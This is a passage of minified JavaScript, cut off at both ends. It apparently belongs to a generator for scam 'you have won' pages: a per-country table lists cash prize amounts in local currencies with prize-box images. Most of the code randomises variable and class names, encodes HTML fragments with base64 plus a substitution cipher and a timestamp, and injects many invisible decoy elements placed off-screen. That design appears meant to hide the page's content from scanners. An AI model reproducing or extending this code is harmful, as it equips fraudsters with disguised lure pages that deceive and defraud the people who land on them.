francs",image:"https://1.bp.blogspot.com/-cLeO9AGFmYY/YKtbHqWHc0I/AAAAAAAABkw/lRIwddnvyvkNaAbB-x-F1v60V_cjcmWBwCLcBGAsYHQ/s16000/Cote-d%2527Ivoire_outbox.png"},ML:{amount:"20 000 francs",image:"https://1.bp.blogspot.com/-cLeO9AGFmYY/YKtbHqWHc0I/AAAAAAAABkw/lRIwddnvyvkNaAbB-x-F1v60V_cjcmWBwCLcBGAsYHQ/s16000/Cote-d%2527Ivoire_outbox.png"},RO:{amount:"2.000 Lei",image:"https://1.bp.blogspot.com/-1Duj3bE2snI/YKpjkHMxwnI/AAAAAAAABeo/V6IL3E_RzMElDmPw_VtcvPqVpaGWlV1vACLcBGAsYHQ/s16000/Romania_outbox.png"},CL:{amount:"500.000 Peso",image:"https://1.bp.blogspot.com/-vlXJ-W0Jmok/YKsjZOs1vFI/AAAAAAAABg4/ei8wRhMDtTwHh3A1xPp8UNJzy0EXiQ4CACLcBGAsYHQ/s16000/Chile_outbox.png"},SY:{amount:"200,000 \u0627\u0644\u0644\u064A\u0631\u0629 \u0627\u0644\u0633\u0648\u0631\u064A\u0629",image:"https://1.bp.blogspot.com/-xCaeVu1dmO8/YKsjdEHH74I/AAAAAAAABig/M_P5uqqYCvQ81AWN_dHsU44kpb81uAKOgCLcBGAsYHQ/s16000/Syria_outbox.png"},KZ:{amount:"100 000 \u0442\u0435\u04A3\u0433\u0435",image:"https://1.bp.blogspot.com/-jk3W77yCbOc/YKtbL4h1v6I/AAAAAAAABmQ/gG0q056ugHANL-a2InIO18sruz5calhtgCLcBGAsYHQ/s16000/Kazakhstan_outbox.png"},GT:{amount:"1,000 Quetzal",image:"https://1.bp.blogspot.com/-Ii_F4XzgyJE/YKpjhIAfnCI/AAAAAAAABdU/G0ZNbKVuxD0mMaPviHqwOSHwTTCk2AZAACLcBGAsYHQ/s16000/Guatemala_outbox.png"},MW:{amount:"70,000 kwacha",image:"https://1.bp.blogspot.com/-nreEJ8wOUq0/YW59qV6t2wI/AAAAAAAAIg4/FxsXCQkvZFkG6vDVwWynFECFOL_9jMI3QCLcBGAsYHQ/s16000/wai.png"},ZM:{amount:"5,000 Kwacha",image:"https://1.bp.blogspot.com/-gcwp9Fuxkkc/YW1xrH8UuqI/AAAAAAAAADY/o4kpq1XhwVosDzrz9NnJXFetnlpLsClNgCLcBGAsYHQ/s16000/wai.png"},NL:{amount:"2.000 euro",image:"https://1.bp.blogspot.com/-qwTEKtxaRkA/YKsja-YiRgI/AAAAAAAABhk/U9G09yuNXds91hRzfrtUpdIqLmAcbKm4QCLcBGAsYHQ/s16000/Netherlands_outbox.png"},EC:{amount:"300 dollars",image:"https://1.bp.blogspot.com/-FKpajgfbf5w/YKpjf9EBwlI/AAAAAAAABc4/78WeJjNjD_Avwq9rlpIImM_5nQ29Fr9rwCLcBGAsYHQ/s16000/Ecuador_outbox.png"},KH:{amount:"1,000,000 \u179A\u17C0\u179B",image:"https://1.bp.blogspot.com/-4_8GCzaPHcI/YW2LZ3XC9FI/AAAAAAAAAEE/hCo_DSBnmiAhCiJlqI3CJn3Jja58IlNFgCLcBGAsYHQ/s16000/wai.png"},SN:{amount:"100 000 francs",image:"https://1.bp.blogspot.com/-cLYC6bs0v58/YKtbREYjV3I/AAAAAAAABoE/lFnnsVP2it8E7V560Hl70KG4e1BO_D1sACLcBGAsYHQ/s16000/Senegal_outbox.png"},TD:{amount:"100 000 francs",image:"https://1.bp.blogspot.com/-tqaTAXcYLmc/YKtbHRlkIpI/AAAAAAAABko/0xcSQz251y41M8q1IPo-plso-3IfErtBACLcBGAsYHQ/s16000/Cameroon_outbox.png"},SO:{amount:"10,000 Shilin",image:"https://1.bp.blogspot.com/-ft7nVgHHqR8/YKtbOLQrcfI/AAAAAAAABnI/HiI4rdpPwUcm3tJ2wBECZuvxn23N6aPeQCLcBGAsYHQ/s16000/Mali_outbox.png"},ZW:{amount:"500 us dollars",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"},RW:{amount:"200 000 Franc",image:"https://1.bp.blogspot.com/-tf9LWVPCEuo/YW1tu7eZ9WI/AAAAAAAAAC4/fDiaYXYv5Ss5x_FkGJTTx9mm8XSfe_QuACLcBGAsYHQ/s16000/wai.png"},GN:{amount:"1 000 000 francs",image:"https://1.bp.blogspot.com/-8rw9Oabqweg/YW57acokFpI/AAAAAAAAIgk/ROuwiTaT2IQk5gIV_XWz6F_0zR9Lu65nQCLcBGAsYHQ/s16000/wai.png"},HT:{amount:"3,000 gourde",image:"https://1.bp.blogspot.com/-lBuiu90jqno/YKtbKLTQiDI/AAAAAAAABlo/tt_DxMOthW4yMf93adBIJrmdA4BUVit6wCLcBGAsYHQ/s16000/Haiti_outbox.png"},BO:{amount:"1.000Bs",image:"https://1.bp.blogspot.com/-fCKSEiNVj48/YKsjYr_pOVI/AAAAAAAABgk/tHhVd0xOZUUwNwRKTcm201J_7uKTOHTOwCLcBGAsYHQ/s16000/Bolivia_outbox.png"},BE:{amount:"1.000 euros",image:"https://1.bp.blogspot.com/-kbgtrJOQsHE/YKtbGkU6svI/AAAAAAAABkY/xbozygoRqkswv5d7YihkyCzRlfTOvSqfwCLcBGAsYHQ/s16000/Belgium_outbox.png"},TN:{amount:"400 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-gChOxNcP7Tk/YKsjd8MMb2I/AAAAAAAABis/Wa3-Wj3QEcs0cpWOun5zTADIfsnI73mZgCLcBGAsYHQ/s16000/Tunisia_outbox.png"},CU:{amount:"10.000 pesos",image:"https://1.bp.blogspot.com/-1AQdtzNPEKU/YKpjfqELXCI/AAAAAAAABcs/9LPDmhD_XiMDbLy4Fo7VGdfitOWhfAFlACLcBGAsYHQ/s16000/Cuba_outbox.png"},BI:{amount:"200 000 Franc",image:"https://1.bp.blogspot.com/-3lOXljnhr9I/YW1gOZQ9NTI/AAAAAAAAAA4/CaQvt0UCVmIImpQEO4tDyEMP9tj53sJmgCLcBGAsYHQ/outbox.png"},GR:{amount:"800 \u0395\u03C5\u03C1\u03CE",image:"https://1.bp.blogspot.com/-Gr8ntJsFbtQ/YKtbJSGiiwI/AAAAAAAABlY/AWOB3OVBJYYJiyNcop8CQ_TgwGx8ZCdpwCLcBGAsYHQ/s16000/Greece_outbox.png"},CZ:{amount:"20 000 koruna",image:"https://1.bp.blogspot.com/-L0M0gyFgA1M/YKtbItnfa3I/AAAAAAAABlI/bAMbBQFUnxoh6H5vyoXFjxgUY_BlHf4DQCLcBGAsYHQ/s16000/Czech-Republic_outbox.png"},JO:{amount:"100 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-Y8H098uthC8/YKtbLmBoy4I/AAAAAAAABmI/FKKhKk1IQB4LXa5o3YDodBhWr6sE3g8EgCLcBGAsYHQ/s16000/Jordan_outbox.png"},DO:{amount:"20.000 Peso",image:"https://1.bp.blogspot.com/-rNnNRLijB8s/YKpjf6tn75I/AAAAAAAABc0/1iWY0SUucPkv5NY2LCPYxRHNbMUkdFCgQCLcBGAsYHQ/s16000/Dominica_outbox.png"},PT:{amount:"1.000 euros",image:"https://1.bp.blogspot.com/-P04M1r9sbT0/YKsjcADtqVI/AAAAAAAABiE/LV06kmE71qIfAktrZTLtsSwxeGHqA8DjgCLcBGAsYHQ/s16000/Portugal_outbox.png"},SE:{amount:"20 000 krona",image:"https://1.bp.blogspot.com/-8I2pGRe9Ayw/YKtbTH764nI/AAAAAAAABo4/F4UqJ0ujbJkR3NOihZO4XwwyUZYLziEigCLcBGAsYHQ/s16000/Sweden_outbox.png"},AZ:{amount:"300 manat",image:"https://1.bp.blogspot.com/-y540oEkVPPM/YKtbE-bwWUI/AAAAAAAABj0/YqvOzrySKwYFXuJ-wTLgwbm9WAUpmyaSQCLcBGAsYHQ/s16000/Azerbaijan_outbox.png"},HU:{amount:"200 000 forint",image:"https://1.bp.blogspot.com/-nVNZZuHjRhA/YVV_gCnuYbI/AAAAAAAADQE/NvNB25Y0aHkK4rnp2gIGs8uNOLylzU1nQCLcBGAsYHQ/s16000/Hungary_outbox.png"},AE:{amount:"8,000 \u0627\u0644\u062F\u0631\u0647\u0645",image:"https://1.bp.blogspot.com/-xp7wyQGeSfc/YKpjls9bRXI/AAAAAAAABfU/6U4oasvo-dk6VUzXpP8clEPd_F85wKvdgCLcBGAsYHQ/s16000/United-Arab-Emirates_outbox.png"},BY:{amount:"1 000 \u0440\u0443\u0431",image:"https://1.bp.blogspot.com/-sqJxB5kCqJE/YW2Wm8MRukI/AAAAAAAAAKg/mOievCq9DJ8JCGpgI0S7V46BTIDRjaBQACLcBGAsYHQ/s16000/oubox.png"},HN:{amount:"3,000 Lempira",image:"https://1.bp.blogspot.com/-SmBV9XAlRIg/YKpjhXFgplI/AAAAAAAABdc/JQ8XUqdBZTAz1-Antvc_5baYrosLRIJzACLcBGAsYHQ/s16000/Honduras_outbox.png"},IL:{amount:"6,000 \u05E9\u05E7\u05DC",image:"https://1.bp.blogspot.com/-YWWTrvuz33U/YKsjaISdHvI/AAAAAAAABhQ/Nl7ehHYIxqQg35USfq9Lio5_22KyDEdYQCLcBGAsYHQ/s16000/Israel_outbox.png"},TJ:{amount:"2 000 \u0441\u043E\u043C\u043E\u043D\u04E3",image:"https://1.bp.blogspot.com/-1b5KMUmDvWM/YKtbTQVShvI/AAAAAAAABo8/rWmsJxleQHM_eLJb7umn5AwgZgN-wTE4QCLcBGAsYHQ/s16000/Tajikistan_outbox.png"},AT:{amount:"2.000 Euro",image:"https://1.bp.blogspot.com/-earaRy719_s/YKpjeX2PqmI/AAAAAAAABcM/AKtGAoZ8ngYYVPJ0vX8bsLwXyVADiePgQCLcBGAsYHQ/s16000/Austria_outbox.png"},PG:{amount:"1,000 Kina",image:"https://1.bp.blogspot.com/-wyJOFuPUdlA/Yaekyu0PUXI/AAAAAAAAA2Y/8HKvg5rkhAUr3qqjKWgf--vAC6w4xW9-wCNcBGAsYHQ/s16000/oubox.png"},CH:{amount:"2'000 franc",image:"https://1.bp.blogspot.com/-ruIhCsk-ULw/YKsjc1BUsXI/AAAAAAAABic/wI5cIIKmPYwtmXrekWDr3udRewBQcoPBwCLcBGAsYHQ/s16000/Switzerland_outbox.png"},SL:{amount:"2,000,000 Leone",image:"https://1.bp.blogspot.com/-AbrIfd5cADo/YYfp87T6c6I/AAAAAAAAB0o/KTRHdOCCLuAmBFJ0v0rEvNW8bk52qWyMACNcBGAsYHQ/s16000/oubox.png"},PY:{amount:"1.000.000 guarani",image:"https://1.bp.blogspot.com/-NMh-yuJkl5U/YW2WD8zm97I/AAAAAAAAAJ4/C2Z8uhKmU_A1_mxdwFggw6LGmVkG_EM-ACLcBGAsYHQ/s16000/oubox.png"},LA:{amount:"2,000,000 \u0E81\u0EB5\u0E9A",image:"https://1.bp.blogspot.com/-OeVIazIBYek/YW2Kg4e-P5I/AAAAAAAAADw/sMLbm3XmmkUS19gv4JfU9eKnAAmZpe7BgCLcBGAsYHQ/s16000/wai.png"},BG:{amount:"1.000 Lev",image:"https://1.bp.blogspot.com/-Y6BB6_U0M7c/YW2WcYcFs1I/AAAAAAAAAKQ/IpwzcCgRy38syAR_0U9DyDA3F1zhRHaRACLcBGAsYHQ/s16000/oubox.png"},RS:{amount:"30 000 \u0434\u0438\u043D\u0430\u0440\u0430",image:"https://1.bp.blogspot.com/-elxSxNPSsFw/YKtbRZwT30I/AAAAAAAABoQ/ycAO1PYNXbQ190YWjVcqwwLdcA_lhmrfwCLcBGAsYHQ/s16000/Serbia_outbox.png"},SV:{amount:"200 dollars",image:"https://1.bp.blogspot.com/-wjI8wGWVdzg/YKsjc8uSE5I/AAAAAAAABiU/_5TBzhv9tskdAjUXvc6K5_MyWwsDnVYRACLcBGAsYHQ/s16000/Salvador_outbox.png"},LY:{amount:"1,000 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-lcqqLZqFjhQ/YW1odQoAC1I/AAAAAAAAACI/OvwlvI6O95EonBXQ9G49Ur3-pPEDAjk3QCLcBGAsYHQ/s16000/wai.png"},NI:{amount:"3.000 C\xF3rdoba",image:"https://1.bp.blogspot.com/-quQvdcMP4TM/YKpjjIV-0cI/AAAAAAAABeM/mYq4dH2iNTwhHs4vG9Xz39ZNiLXulEDxgCLcBGAsYHQ/s16000/Nicaragua_outbox.png"},KG:{amount:"10 000 \u0441\u043E\u043C",image:"https://1.bp.blogspot.com/-3Bklo8nLlkY/YKtbM-_EJZI/AAAAAAAABmo/YERQo4MK2G86EVr1jBjM6vLWGEJulfKGwCLcBGAsYHQ/s16000/Kyrgyzstan_outbox.png"},LB:{amount:"10.000.000 \u0644\u064A\u0631\u0629 \u0644\u0628\u0646\u0627\u0646\u064A\u0629",image:"https://1.bp.blogspot.com/-Wdwn71ZYaMw/YKtbNP_1LyI/AAAAAAAABmw/vjZ_JhlGCS0hVTL5m0GwkOmHaOXf1bkFwCLcBGAsYHQ/s16000/Lebanon_outbox.png"},DK:{amount:"10.000 Krona",image:"https://1.bp.blogspot.com/-EkM09TmaSVA/YVV_fYYlg3I/AAAAAAAADP4/a9XZxbDD-Doz-EstbRK6ACjOZ5QgGbQJwCLcBGAsYHQ/s16000/Denmark_outbox.png"},TM:{amount:"1 000 \u043C\u0430\u043D\u0430\u0442",image:"https://1.bp.blogspot.com/-OJqxAFrwz5A/YcXZuwXEQnI/AAAAAAAAKVY/tZ9WnEaPPFUpx4wmFA9YQ0R5sRIrFNNSwCNcBGAsYHQ/s16000/outbox.png"},FI:{amount:"1.000 euroa",image:"https://1.bp.blogspot.com/-mhFwYo28B2Q/YKppmIsu7ZI/AAAAAAAABgQ/c7DWa0Yxwm49LJDcNEkzDr503wyn4hLtACLcBGAsYHQ/s16000/Germany_outbox.png"},CF:{amount:"100 000 francs",image:"https://1.bp.blogspot.com/-tqaTAXcYLmc/YKtbHRlkIpI/AAAAAAAABko/0xcSQz251y41M8q1IPo-plso-3IfErtBACLcBGAsYHQ/s16000/Cameroon_outbox.png"},SK:{amount:"1.000 Euro",image:"https://1.bp.blogspot.com/-mhFwYo28B2Q/YKppmIsu7ZI/AAAAAAAABgQ/c7DWa0Yxwm49LJDcNEkzDr503wyn4hLtACLcBGAsYHQ/s16000/Germany_outbox.png"},NO:{amount:"30 000 kroner",image:"https://1.bp.blogspot.com/-6OjTtrMq588/YKsjbL-wmoI/AAAAAAAABhs/UuUHtZD40v4QF-PMdm29IuYEYXf1-gCCwCLcBGAsYHQ/s16000/Norway_outbox.png"},CR:{amount:"300.000 colones",image:"https://1.bp.blogspot.com/-cND1M_pCI9k/YKpjfOE4uLI/AAAAAAAABck/L1Wy-fCpngYzOLV_OqRIfTWWAEig-VJjQCLcBGAsYHQ/s16000/Costa-Rica_outbox.png"},NZ:{amount:"1,000 Dollar",image:"https://1.bp.blogspot.com/-zxSBvJhwO48/YZIN6CUwq2I/AAAAAAAABbQ/znLCf9oV6hcHZMUgggicx01D3PH7jZXmACLcBGAsYHQ/s16000/wai.png"},IE:{amount:"1,000 Euro",image:"https://1.bp.blogspot.com/-pFC-yOlze4o/YKtbLLNyFNI/AAAAAAAABmE/P1YooIcOeS4y1Q_wSRNMT-9FS_MZTBT1ACLcBGAsYHQ/s16000/Ireland_outbox.png"},OM:{amount:"300 \u0631\u064A\u0627\u0644",image:"https://1.bp.blogspot.com/-EIFuKBo0LZA/YKsjbepyKQI/AAAAAAAABh0/V1vt08tt7qQAOeHWsWbg0jAUG6AMEGRewCLcBGAsYHQ/s16000/Oman_outbox.png"},LR:{amount:"40,000 Dollar",image:"https://1.bp.blogspot.com/-DK-_YiBjoXA/YW1lo6WTxII/AAAAAAAAAB4/7DqO1A_ic88SfbC2YxBTK06VepFkMJs2gCLcBGAsYHQ/s16000/wai.png"},KW:{amount:"400 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-vPNHuC1ifZQ/YKtbMimup0I/AAAAAAAABmg/bIx0p-30ecc0wfryERzKP9z1ISfJ-SraQCLcBGAsYHQ/s16000/Kuwait_outbox.png"},PA:{amount:"700 dollars",image:"https://1.bp.blogspot.com/-7PWaHGrV8A4/YKsjb0ilX7I/AAAAAAAABiA/ZL2mhP5kroQi5DTamgzbpuC97x1TQcIewCLcBGAsYHQ/s16000/Panama_outbox.png"},HR:{amount:"4.000 kuna",image:"https://1.bp.blogspot.com/-Fw9tfsNvxJI/YKtbH2hRIzI/AAAAAAAABk4/OLoqFtfLQzcM0Q9qq_4GJhn3W2D6Na7HgCLcBGAsYHQ/s16000/Croatia_outbox.png"},MR:{amount:"200.000 \u0623\u0648\u0642\u064A\u0629 \u062C\u062F\u064A\u062F\u0629",image:"https://1.bp.blogspot.com/-3itSmb6rt7Y/YW1ppYgc7GI/AAAAAAAAACY/8BB6HG_fsYMmmHjBhBw1xq0BOpTxaf46ACLcBGAsYHQ/s16000/wai.png"},GE:{amount:"2.000 \u10DA\u10D0\u10E0\u10D8",image:"https://1.bp.blogspot.com/-JPXpF2xCI4Q/YKtbJClHc7I/AAAAAAAABlQ/4g8BhJEW7C8728oOgSmqrhIvzgu9RK6bwCLcBGAsYHQ/s16000/Georgia_outbox.png"},MD:{amount:"2.000 Leu",image:"https://1.bp.blogspot.com/-XclUYWX0Sbs/YKtbPUD_7hI/AAAAAAAABng/ckmzTBZJS0QZtIX3jbWn4LoAZsUne0t4wCLcBGAsYHQ/s16000/Moldova_outbox.png"},UY:{amount:"30.000 Peso",image:"https://1.bp.blogspot.com/-LNn8ZieVlDk/YKtbUvjK5fI/AAAAAAAABpY/lZDpDWoIOWkLEleOgcZEW3SfE3_bVO6vACLcBGAsYHQ/s16000/Uruguay_outbox.png"},BA:{amount:"400 KM",image:"https://1.bp.blogspot.com/-e0PjmvmMeDA/YKtbG6c2FoI/AAAAAAAABkg/6rrN-IqxDHMpF38QyudBKgHK0uT-uEBpgCLcBGAsYHQ/s16000/Bosnia-and-Herzegovina_outbox.png"},MN:{amount:"400.000 \u0442\u04E9\u0433",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"},ER:{amount:"800 Nakfa",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"},PR:{amount:"1,000 Dollar",image:"https://1.bp.blogspot.com/-fQpWXXZGmVI/YKsjcT2fugI/AAAAAAAABiM/pxvChUiA-FQPDaJp_yOViYRSYsu5DXmqQCLcBGAsYHQ/s16000/Puerto%2BRico_outbox.png"},AM:{amount:"100.000 \u0564\u0580\u0561\u0574",image:"https://cdnbun.com/upload/yameioubox.png"},AL:{amount:"20.000 lek\xEB",image:"https://1.bp.blogspot.com/-SY5hnuu7ZCY/YKtbEAKsBNI/AAAAAAAABjg/1Li_Zf-CzgseL6mTkdgZ5Ea32qTcu4ZAQCLcBGAsYHQ/s16000/Albania_outbox.png"},LT:{amount:"1.000 eur\u0173",image:"https://1.bp.blogspot.com/-qbhqzDbNOso/YKpjiMUMb8I/AAAAAAAABdw/qx4SegCpUeISQH01X-vJmrhpmcAPGgTMwCLcBGAsYHQ/s16000/Italy_outbox.png"},QA:{amount:"10,000 \u0631\u064A\u0627\u0644",image:"https://1.bp.blogspot.com/-s0633fOjKjI/YKtbQvPBaII/AAAAAAAABn4/Qp9guITpJKwkjAN52wzXDuDCkqyD8VecQCLcBGAsYHQ/s16000/Qatar_outbox.png"},JM:{amount:"30,000 Dollars",image:"https://1.bp.blogspot.com/-cAC8usYmj3Q/YKsjad-h7eI/AAAAAAAABhU/A4IVQd3SnikOAc6YnXFcKzsUejcGIvLxACLcBGAsYHQ/s16000/Jamaica_outbox.png"},NA:{amount:"4,000 Dollar",image:"https://1.bp.blogspot.com/-iTJka9h-y24/YW1q0AH3pWI/AAAAAAAAACk/Ozgp5CkTaRkWmm0NKC8pxXwzPYXQR8jbwCLcBGAsYHQ/s16000/wai.png"},BW:{amount:"4,000 Pula",image:"https://1.bp.blogspot.com/-G3u0IKlLA7U/YW1e_JQ6TNI/AAAAAAAAAAU/bAl947tdM2UbBI-y2IpLw1hMThDNITnYgCLcBGAsYHQ/s16000/outbox.png"},GM:{amount:"10,000 Dalasi",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"},SI:{amount:"1.000 Evro",image:"https://1.bp.blogspot.com/-qbhqzDbNOso/YKpjiMUMb8I/AAAAAAAABdw/qx4SegCpUeISQH01X-vJmrhpmcAPGgTMwCLcBGAsYHQ/s16000/Italy_outbox.png"},MK:{amount:"10.000 \u0434\u0435\u043D\u0430\u0440\u0438",image:"https://1.bp.blogspot.com/-opiWmT-Q2Cw/YW2XDgkhTCI/AAAAAAAAAK0/BwxEPIvOSB47rZ6y0uCMcA_LU2JdiTjcACLcBGAsYHQ/s16000/oubox.png"},LS:{amount:"2,000 Maloti",image:"https://1.bp.blogspot.com/-XedrrEHxCjQ/YW1kiA-bSAI/AAAAAAAAABo/VQ7Lr9qhcZIpv_U4rq5TpJgyMZuydsGIQCLcBGAsYHQ/s16000/wai.png"},LV:{amount:"1.000 Euro",image:"https://1.bp.blogspot.com/-qbhqzDbNOso/YKpjiMUMb8I/AAAAAAAABdw/qx4SegCpUeISQH01X-vJmrhpmcAPGgTMwCLcBGAsYHQ/s16000/Italy_outbox.png"},GW:{amount:"50.000 Francos",image:"https://1.bp.blogspot.com/-cLeO9AGFmYY/YKtbHqWHc0I/AAAAAAAABkw/lRIwddnvyvkNaAbB-x-F1v60V_cjcmWBwCLcBGAsYHQ/s16000/Cote-d%2527Ivoire_outbox.png"},BH:{amount:"1,000 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-ozBG4CYf6hw/YKtbFam2DfI/AAAAAAAABj4/yLHHzVOL5QwFfQNF-Pcy-5IAe2GgSvUigCLcBGAsYHQ/s16000/Bahrain_outbox.png"},TL:{amount:"800 dollars",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"},TT:{amount:"2,000 TT$",image:"https://1.bp.blogspot.com/-vaAQx63A9A4/YKtbUE0QCAI/AAAAAAAABpQ/GcQWwoavobEGijhwmRPJhwYFPOwcr4ouACLcBGAsYHQ/s16000/Trinidad-and-Tobago_outbox.png"},GQ:{amount:"100.000 Francos",image:"https://1.bp.blogspot.com/-tqaTAXcYLmc/YKtbHRlkIpI/AAAAAAAABko/0xcSQz251y41M8q1IPo-plso-3IfErtBACLcBGAsYHQ/s16000/Cameroon_outbox.png"},EE:{amount:"1.000 Euro",image:"https://1.bp.blogspot.com/-qbhqzDbNOso/YKpjiMUMb8I/AAAAAAAABdw/qx4SegCpUeISQH01X-vJmrhpmcAPGgTMwCLcBGAsYHQ/s16000/Italy_outbox.png"},MU:{amount:"10,000 Rupees",image:"https://1.bp.blogspot.com/-CfKYOU1nruY/YKtbO_HI3fI/AAAAAAAABnc/VhStGNmd_hEdNhXkXh6Uek74oh7DWrMlQCLcBGAsYHQ/s16000/Mauritius_outbox.png"},SZ:{amount:"5,000 emalangeni",image:"https://1.bp.blogspot.com/-l7433dtP93s/YZM8MCG219I/AAAAAAAAJAs/LBOAF4vwRUkVVkJ2XPd2JFaOxFumst6OQCLcBGAsYHQ/s16000/wai.png"},DJ:{amount:"50 000 \u0641\u0631\u0646\u0643",image:"https://1.bp.blogspot.com/-5ToKQa-b0Bo/YW1jFXXeY4I/AAAAAAAAABQ/mQ6LZsUSYH0T6knOMj8srrzrxYjcia1CACLcBGAsYHQ/s16000/wai.png"},US:{amount:"3,000 dollars",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"},DEFAULT:{amount:"800 dollars",image:"https://1.bp.blogspot.com/-tgdyzabxuJ4/YKpjmQ_UJKI/AAAAAAAABfk/VqO0bIY6vq0EZ9BvCyHwfUT8owQt7dzWwCLcBGAsYHQ/s16000/United-States_outbox.png"}};function S(o){return O[o]||O.DEFAULT}var I=class{constructor(){this.randomNames=this.generateRandomNames()}generateRandomNames(){let e="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",t=(a=8)=>Array.from({length:a},()=>e[Math.floor(Math.random()*e.length)]).join(""),n={configVar:t(6),fragmentsVar:t(8),decryptFunc:t(10),assembleFunc:t(12),fragment1Var:t(7),fragment2Var:t(7),fragment3Var:t(7),fullHTMLVar:t(9),obfuscationVar:t(11)};for(let a=1;a<=20;a++)n[`cssClass${a}`]=t(6);return n}encryptFragment(e){try{let t=this.safeBase64Encode(e),n=this.safeCharReplaceEncrypt(t);return this.safeAddTimestampObfuscation(n)}catch(t){return console.error("\u274C \u52A0\u5BC6\u5931\u8D25:",t.message),null}}safeBase64Encode(e){try{let t=new TextEncoder().encode(e),n="";for(let a=0;a<t.length;a++)n+=String.fromCharCode(t[a]);return btoa(n)}catch{return btoa(decodeURIComponent(encodeURIComponent(e)))}}safeCharReplaceEncrypt(e){let t={A:"Q",B:"W",C:"E",D:"R",E:"T",F:"Y",G:"U",H:"I",I:"O",J:"P",K:"A",L:"S",M:"D",N:"F",O:"G",P:"H",Q:"J",R:"K",S:"L",T:"Z",U:"X",V:"C",W:"V",X:"B",Y:"N",Z:"M",a:"q",b:"w",c:"e",d:"r",e:"t",f:"y",g:"u",h:"i",i:"o",j:"p",k:"a",l:"s",m:"d",n:"f",o:"g",p:"h",q:"j",r:"k",s:"l",t:"z",u:"x",v:"c",w:"v",x:"b",y:"n",z:"m",0:"9",1:"8",2:"7",3:"6",4:"5",5:"4",6:"3",7:"2",8:"1",9:"0","+":"/","/":"+","=":"="};return e.split("").map(n=>t[n]||n).join("")}safeAddTimestampObfuscation(e){let t=Date.now().toString();return e+"|"+t}generateObfuscationFragments(){return[{tag:"div",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;clip:rect(0,0,0,0)!important;"},{tag:"img",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"'},{tag:"button",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;"},{tag:"input",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'type="text" value=""'},{tag:"a",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;",attrs:'href="#"'},{tag:"p",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;"},{tag:"h3",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;transform:scale(0)!important;"},{tag:"ul",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;clip:rect(0,0,0,0)!important;"},{tag:"table",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;max-height:0!important;overflow:hidden!important;"},{tag:"form",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;max-width:0!important;overflow:hidden!important;"},{tag:"select",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;"},{tag:"textarea",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;"},{tag:"canvas",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'width="0" height="0"'},{tag:"video",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'width="0" height="0"'},{tag:"audio",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;"},{tag:"progress",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'value="0" 